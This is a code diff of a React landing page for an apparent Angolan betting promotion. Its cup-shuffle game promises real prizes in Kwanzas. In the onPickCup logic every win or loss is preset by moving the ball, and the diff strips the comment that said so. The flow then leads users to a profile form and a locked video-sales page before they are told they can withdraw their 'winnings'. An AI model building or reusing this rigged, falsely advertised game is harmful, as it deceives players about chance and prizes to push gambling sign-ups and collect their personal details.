@@ -1,18 +1,5 @@
-import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useMemo, useState } from "react";
 import { Cup } from "@/components/Cup";
-
-export const Route = createFileRoute("/")({
-  head: () => ({
-    meta: [
-      { title: "BantuBet 5 Anos — Acerta e Ganha" },
-      { name: "description", content: "Celebra os 5 anos da BantuBet. Joga o jogo dos copos e ganha prémios reais em Kwanzas." },
-      { property: "og:title", content: "BantuBet 5 Anos — Acerta e Ganha" },
-      { property: "og:description", content: "15 rodadas grátis. Acerta no copo certo e leva o prémio." },
-    ],
-  }),
-  component: Index,
-});
 
 type Stage =
   | "landing"
@@ -22,11 +9,9 @@ type Stage =
   | "reveal-win"
   | "reveal-lose"
   | "final"
-  | "vsl"
   | "register"
   | "profile"
-  | "done";
-
+  | "vsl";
 
 const TOTAL_ROUNDS = 12;
 const WINS_TOTAL = 6;
@@ -48,7 +33,7 @@ function formatKz(n: number) {
   return n.toLocaleString("fr-FR").replace(/\u202F/g, " ");
 }
 
-function Index() {
+export default function App() {
   const [stage, setStage] = useState<Stage>("landing");
   const [round, setRound] = useState(1);
   const [balance, setBalance] = useState(0);
@@ -58,7 +43,6 @@ function Index() {
   const [countdown, setCountdown] = useState(3);
   const [outcomes, setOutcomes] = useState<boolean[]>(() => buildOutcomes());
 
-  // Prepare countdown
   useEffect(() => {
     if (stage !== "prepare") return;
     setCountdown(3);
@@ -93,7 +77,6 @@ function Index() {
   const onPickCup = (i: number) => {
     setPickedCup(i);
     const shouldWin = outcomes[round - 1];
-    // Force the outcome by reassigning the winning cup
     if (shouldWin) {
       setWinningCup(i);
     } else if (i === winningCup) {
@@ -130,20 +113,16 @@ function Index() {
       {stage === "intro" && <IntroModal onPlay={beginRound} onClose={() => setStage("landing")} />}
       {stage === "prepare" && <Prepare round={round} countdown={countdown} />}
       {stage === "pick" && (
-        <Pick
-          round={round}
-          pickedCup={pickedCup}
-          winningCup={winningCup}
-          onPick={onPickCup}
-        />
+        <Pick round={round} pickedCup={pickedCup} winningCup={winningCup} onPick={onPickCup} />
       )}
       {stage === "reveal-win" && <RevealWin amount={lastWin} onNext={nextRound} />}
       {stage === "reveal-lose" && <RevealLose onNext={nextRound} />}
-      {stage === "final" && <FinalPrize amount={balance} onContinue={() => setStage("vsl")} />}
-      {stage === "vsl" && <VslStage amount={balance} onContinue={() => setStage("register")} />}
+      {stage === "final" && <FinalPrize amount={balance} onContinue={() => setStage("register")} />}
       {stage === "register" && <RegisterIntro amount={balance} onContinue={() => setStage("profile")} />}
-      {stage === "profile" && <ProfileFlow balance={balance} onDone={() => setStage("done")} onBack={() => setStage("register")} />}
-      {stage === "done" && <Done amount={balance} onRestart={startGame} />}
+      {stage === "profile" && (
+        <ProfileFlow balance={balance} onDone={() => setStage("vsl")} onBack={() => setStage("register")} />
+      )}
+      {stage === "vsl" && <VslStage amount={balance} onRestart={startGame} />}
 
       <Footer />
     </main>
@@ -213,10 +192,7 @@ function Landing({ onStart }: { onStart: () => void }) {
         Descubra recompensas exclusivas no nosso jogo de copos. Cada rodada é uma chance real de levantar prémios em Kwanzas.
       </p>
 
-      <button
-        onClick={onStart}
-        className="btn-primary btn-primary-hover mt-10 w-full max-w-sm py-4 text-lg"
-      >
+      <button onClick={onStart} className="btn-primary btn-primary-hover mt-10 w-full max-w-sm py-4 text-lg">
         Participar no evento
       </button>
 
@@ -350,35 +326,25 @@ function Pick({
   winningCup: number;
   onPick: (i: number) => void;
 }) {
-  // slotOf[cupId] = current slot index (0, 1, 2)
   const [slotOf, setSlotOf] = useState<[number, number, number]>([0, 1, 2]);
   const [phase, setPhase] = useState<PickPhase>("show");
 
-  // Reset whenever the round changes
   useEffect(() => {
     setSlotOf([0, 1, 2]);
     setPhase("show");
-
-    // Show ball under winning cup for 1.2s
-    const showTimer = setTimeout(() => {
-      setPhase("shuffle");
-    }, 1300);
-
+    const showTimer = setTimeout(() => setPhase("shuffle"), 1300);
     return () => clearTimeout(showTimer);
   }, [round]);
 
-  // Shuffle sequence
   useEffect(() => {
     if (phase !== "shuffle") return;
     let swaps = 0;
-    const maxSwaps = 7 + Math.floor(Math.random() * 4); // 7-10 swaps
+    const maxSwaps = 7 + Math.floor(Math.random() * 4);
     const id = setInterval(() => {
       setSlotOf((prev) => {
-        // pick two distinct slot indices to swap
         const a = Math.floor(Math.random() * 3);
         let b = Math.floor(Math.random() * 3);
         if (b === a) b = (a + 1) % 3;
-        // find which cup IDs are in slot a and slot b
         const next = [...prev] as [number, number, number];
         for (let i = 0; i < 3; i++) {
           if (prev[i] === a) next[i] = b;
@@ -395,7 +361,6 @@ function Pick({
     return () => clearInterval(id);
   }, [phase]);
 
-  // Reveal after pick
   useEffect(() => {
     if (pickedCup !== null) setPhase("revealed");
   }, [pickedCup]);
@@ -428,7 +393,6 @@ function Pick({
         {phase === "revealed" && " "}
       </p>
 
-      {/* Stage with absolutely-positioned cups that slide between slots */}
       <div className="relative mx-auto mt-10 h-[180px] w-full max-w-[360px]">
         {[0, 1, 2].map((cupId) => {
           const slot = slotOf[cupId];
@@ -453,7 +417,6 @@ function Pick({
                   : "border-border bg-card/30 cursor-default"
               }`}
             >
-              {/* Ball visible when cup is lifted in show phase, or when revealed */}
               {(lifted || revealHere) && (
                 <span
                   className="absolute bottom-3 grid h-9 w-9 place-items-center rounded-full bg-yellow-400 text-base shadow-lg"
@@ -530,95 +493,6 @@ function FinalPrize({ amount, onContinue }: { amount: number; onContinue: () => 
   );
 }
 
-function VslStage({ amount, onContinue }: { amount: number; onContinue: () => void }) {
-  const [unlocked, setUnlocked] = useState(false);
-  const [secs, setSecs] = useState(60);
-
-  useEffect(() => {
-    const id = "converteai-smartplayer-sdk";
-    if (!document.getElementById(id)) {
-      const s = document.createElement("script");
-      s.id = id;
-      s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
-      s.async = true;
-      document.head.appendChild(s);
-    }
-  }, []);
-
-  useEffect(() => {
-    if (unlocked) return;
-    const id = setInterval(() => {
-      setSecs((s) => {
-        if (s <= 1) {
-          clearInterval(id);
-          setUnlocked(true);
-          return 0;
-        }
-        return s - 1;
-      });
-    }, 1000);
-    return () => clearInterval(id);
-  }, [unlocked]);
-
-  return (
-    <section className="flex flex-1 flex-col px-4 pt-4 pb-8">
-      <div className="mx-auto mb-3 inline-flex items-center gap-2 rounded-full bg-black/40 border border-white/10 px-4 py-1.5 text-sm">
-        <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
-        <span className="font-bold">{formatKz(amount)} Kz</span>
-        <span className="text-muted-foreground">aguardando</span>
-      </div>
-      <h2 className="text-center text-base font-extrabold leading-snug px-2">
-        Veja agora como registar a sua conta BantuBet e liberar os seus ganhos em menos de{" "}
-        <span className="text-primary">2 minutos</span>
-      </h2>
-
-      <div
-        id="ifr_6a4411099f833d59d0f25a77_wrapper"
-        style={{ margin: "16px auto 0", width: "100%", maxWidth: 400 }}
-      >
-        <div
-          id="ifr_6a4411099f833d59d0f25a77_aspect"
-          style={{ position: "relative", padding: "178.21782178217822% 0 0 0" }}
-        >
-          <iframe
-            frameBorder={0}
-            allowFullScreen
-            src="about:blank"
-            id="ifr_6a4411099f833d59d0f25a77"
-            style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%" }}
-            referrerPolicy="origin"
-            onLoad={(e) => {
-              const el = e.currentTarget as HTMLIFrameElement;
-              if (el.dataset.loaded === "1") return;
-              el.dataset.loaded = "1";
-              el.src =
-                "https://scripts.converteai.net/220eed4f-7bc0-4763-844a-46ae45601574/players/6a4411099f833d59d0f25a77/v4/embed.html" +
-                (location.search || "?") +
-                "&vl=" +
-                encodeURIComponent(location.href);
-            }}
-          />
-        </div>
-      </div>
-
-      <div className="mt-6">
-        {unlocked ? (
-          <button onClick={onContinue} className="btn-primary btn-primary-hover w-full py-4 text-base font-extrabold">
-            ➕ Cadastrar e levantar {formatKz(amount)} Kz
-          </button>
-        ) : (
-          <button disabled className="w-full rounded-2xl border border-white/10 bg-black/40 py-4 text-sm text-muted-foreground">
-            🔒 Aguarda {secs}s para liberar o cadastro
-          </button>
-        )}
-        <p className="mt-3 text-center text-[11px] text-muted-foreground">
-          Assiste ao vídeo para garantir o levantamento dos teus ganhos.
-        </p>
-      </div>
-    </section>
-  );
-}
-
 function RegisterIntro({ amount, onContinue }: { amount: number; onContinue: () => void }) {
   return (
     <section className="flex flex-1 flex-col px-5 pt-6">
@@ -660,7 +534,6 @@ function Benefit({ icon, label }: { icon: string; label: string }) {
   );
 }
 
-/* Profile multi-step */
 const PROVINCIAS = [
   "Luanda", "Benguela", "Huíla", "Huambo", "Bié", "Cabinda", "Cuando-Cubango",
   "Cuanza-Norte", "Cuanza-Sul", "Cunene", "Lunda-Norte", "Lunda-Sul",
@@ -873,9 +746,7 @@ function ProfileFlow({ balance, onDone, onBack }: { balance: number; onDone: () 
         disabled={!canContinue}
         onClick={handleNext}
         className={`mt-auto mb-6 w-full rounded-full py-4 text-base font-bold transition ${
-          canContinue
-            ? "btn-primary btn-primary-hover"
-            : "bg-card text-muted-foreground/60"
+          canContinue ? "btn-primary btn-primary-hover" : "bg-card text-muted-foreground/60"
         }`}
       >
         {finalLabel}
@@ -893,21 +764,90 @@ function Row({ k, v }: { k: string; v: string }) {
   );
 }
 
-function Done({ amount, onRestart }: { amount: number; onRestart: () => void }) {
+function VslStage({ amount, onRestart }: { amount: number; onRestart: () => void }) {
+  const [unlocked, setUnlocked] = useState(false);
+  const [secs, setSecs] = useState(60);
+
+  useEffect(() => {
+    const id = "converteai-smartplayer-sdk";
+    if (!document.getElementById(id)) {
+      const s = document.createElement("script");
+      s.id = id;
+      s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+      s.async = true;
+      document.head.appendChild(s);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (unlocked) return;
+    const id = setInterval(() => {
+      setSecs((s) => {
+        if (s <= 1) {
+          clearInterval(id);
+          setUnlocked(true);
+          return 0;
+        }
+        return s - 1;
+      });
+    }, 1000);
+    return () => clearInterval(id);
+  }, [unlocked]);
+
   return (
-    <section className="flex flex-1 flex-col items-center justify-center px-5">
-      <div className="w-full rounded-3xl border border-border bg-card p-8 text-center shadow-[var(--shadow-card)]">
-        <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-success/20 text-3xl">✅</div>
-        <h3 className="mt-4 text-2xl font-extrabold">Conta criada com sucesso!</h3>
-        <p className="mt-2 text-sm text-muted-foreground">
-          O teu prémio será transferido para a tua conta BantuBet em instantes.
-        </p>
-        <div className="mt-5 rounded-xl bg-black/30 py-4 text-3xl font-extrabold text-primary">
-          {formatKz(amount)} Kz
+    <section className="flex flex-1 flex-col px-4 pt-4 pb-8">
+      <div className="mx-auto mb-3 inline-flex items-center gap-2 rounded-full bg-black/40 border border-white/10 px-4 py-1.5 text-sm">
+        <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
+        <span className="font-bold">{formatKz(amount)} Kz</span>
+        <span className="text-muted-foreground">aguardando</span>
+      </div>
+      <h2 className="text-center text-base font-extrabold leading-snug px-2">
+        Veja agora como registar a sua conta BantuBet e liberar os seus ganhos em menos de{" "}
+        <span className="text-primary">2 minutos</span>
+      </h2>
+
+      <div
+        id="ifr_6a4411099f833d59d0f25a77_wrapper"
+        style={{ margin: "16px auto 0", width: "100%", maxWidth: 400 }}
+      >
+        <div
+          id="ifr_6a4411099f833d59d0f25a77_aspect"
+          style={{ position: "relative", padding: "178.21782178217822% 0 0 0" }}
+        >
+          <iframe
+            frameBorder={0}
+            allowFullScreen
+            src="about:blank"
+            id="ifr_6a4411099f833d59d0f25a77"
+            style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%" }}
+            referrerPolicy="origin"
+            onLoad={(e) => {
+              const el = e.currentTarget as HTMLIFrameElement;
+              if (el.dataset.loaded === "1") return;
+              el.dataset.loaded = "1";
+              el.src =
+                "https://scripts.converteai.net/220eed4f-7bc0-4763-844a-46ae45601574/players/6a4411099f833d59d0f25a77/v4/embed.html" +
+                (location.search || "?") +
+                "&vl=" +
+                encodeURIComponent(location.href);
+            }}
+          />
         </div>
-        <button onClick={onRestart} className="btn-primary btn-primary-hover mt-6 w-full py-4">
-          Voltar ao início
-        </button>
+      </div>
+
+      <div className="mt-6">
+        {unlocked ? (
+          <button onClick={onRestart} className="btn-primary btn-primary-hover w-full py-4 text-base font-extrabold">
+            ↻ Voltar ao início
+          </button>
+        ) : (
+          <button disabled className="w-full rounded-2xl border border-white/10 bg-black/40 py-4 text-sm text-muted-foreground">
+            🔒 Aguarda {secs}s
+          </button>
+        )}
+        <p className="mt-3 text-center text-[11px] text-muted-foreground">
+          Assiste ao vídeo para garantir o levantamento dos teus ganhos.
+        </p>
       </div>
     </section>
   );
